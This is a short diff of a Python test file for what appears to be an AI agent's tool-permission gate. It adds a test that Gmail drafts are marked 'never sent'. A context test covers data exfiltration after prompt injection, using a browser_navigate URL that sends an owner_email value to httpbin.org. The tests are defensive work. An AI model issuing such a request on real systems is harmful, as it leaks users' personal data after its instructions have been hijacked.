@@ -1310,3 +1310,9 @@ def test_same_site_exfil_after_injection(store):
     d = decide(store, "browser_navigate", {"url": "https://httpbin.org/anything/collect?owner_email=a@b.com"}, "tj")
     assert d.decision == ASK, d
     assert decide(store, "browser_navigate", {"url": "https://httpbin.org/get"}, "tj").decision == ALLOW
+
+
+def test_draft_messages_are_marked_never_sent():
+    d = Gmail.public({"id": "1", "subject": "Re: HG-55821", "draft": True, "_unsub": None})
+    assert "never sent" in d["status"] and "_unsub" not in d
+    assert "status" not in Gmail.public({"id": "2", "subject": "hi"})
